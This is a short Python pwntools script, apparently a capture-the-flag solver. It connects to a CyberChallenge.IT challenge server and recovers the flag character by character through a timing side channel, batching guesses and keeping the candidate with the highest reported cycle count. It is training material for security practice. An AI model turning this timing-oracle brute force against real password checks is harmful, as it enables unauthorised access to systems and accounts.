#!/bin/python3
from pwn import *
from string import printable
import re

HOST = "benchmark.challs.cyberchallenge.it"
PORT = 9031
KEY_ALPHABET = printable[:-5]

# def get_pass_timing(c, p):
#   c.recvuntil("Give me the password to check:")
#   c.sendline(p.encode())
#   rdata = c.recvuntil('cycles')
#   cycles = rdata.decode().split(' ')[-3]
#   return int(cycles)

def get_pass_timings(c, passwords):
  c.sendline(b'\n'.join(p.encode() for p in passwords))
  cycles_list = []
  while len(cycles_list)<len(passwords):
    try: rdata = c.recvline_contains('cycles').decode()
    except EOFError: break
    cycles = rdata.split(' ')[-3]
    cycles_list.append(int(cycles))
  return dict(zip(cycles_list, passwords))

def main():
  c = remote(HOST, PORT)
  flag_re = re.compile("CCIT\{.+\}")
  flag = ''
  
  while not flag_re.match(flag):
    t = get_pass_timings(c, [flag+c for c in KEY_ALPHABET])
    best_guess = t[max(t)]
    flag = best_guess
    print(flag)


if __name__ == "__main__":
  main()